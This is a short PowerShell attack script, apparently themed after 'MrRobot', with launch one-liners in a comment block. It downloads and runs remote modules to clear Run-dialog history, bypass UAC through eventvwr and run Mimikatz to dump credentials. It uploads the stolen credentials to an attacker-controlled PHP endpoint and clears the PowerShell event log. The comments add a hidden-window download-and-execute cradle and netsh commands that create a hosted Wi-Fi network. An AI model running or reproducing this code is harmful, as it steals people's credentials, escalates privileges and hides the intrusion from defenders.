function x {
	$SERVER = $args[0]
	
	Invoke-Expression (New-Object Net.WebClient).DownloadString("$SERVER/Clean-RunMRU.psm1")
	Clean-RunMRU -Last
	
	$Command = "

	Invoke-Expression (New-Object Net.WebClient).DownloadString('$SERVER/Invoke-Mimikatz.psm1')
	`$Creds = Invoke-Mimikatz -DumpCreds
	(New-Object System.Net.WebClient).UploadString('$SERVER/x.php',`$Creds)
	# Clear EventLog
	Clear-EventLog -LogName 'Windows PowerShell'
	"
	
	Invoke-Expression (New-Object Net.WebClient).DownloadString("$SERVER/Invoke-EventVwrBypass.psm1")
	Invoke-EventVwrBypass -Command ('Powershell -EncodedCommand ' + $([Convert]::ToBase64String($([System.Text.Encoding]::Unicode.GetBytes($Command))))) -Force
}
<#

powershell -W H Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/MrRobot/payload.ps1'); x http://127.0.0.1/MrRobot

netsh wlan set hostednetwork mode=allow ssid=JIMENEZ key=12345678
netsh wlan start hostednetwork
#powershell "while (!(ping 192.168.0.1 -n 1)[2].Contains('192.168.0.1')){}; Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://127.0.0.1/MrRobot/payload.ps1'); x http://127.0.0.1/MrRobot"
powershell "while (!(ping 192.168.0.100 -n 1)[2].Contains('192.168.0.100')){}; Invoke-Expression (New-Object System.Net.WebClient).DownloadString('http://192.168.0.100/MrRobot/payload.ps1'); x http://192.168.0.100/MrRobot"
#>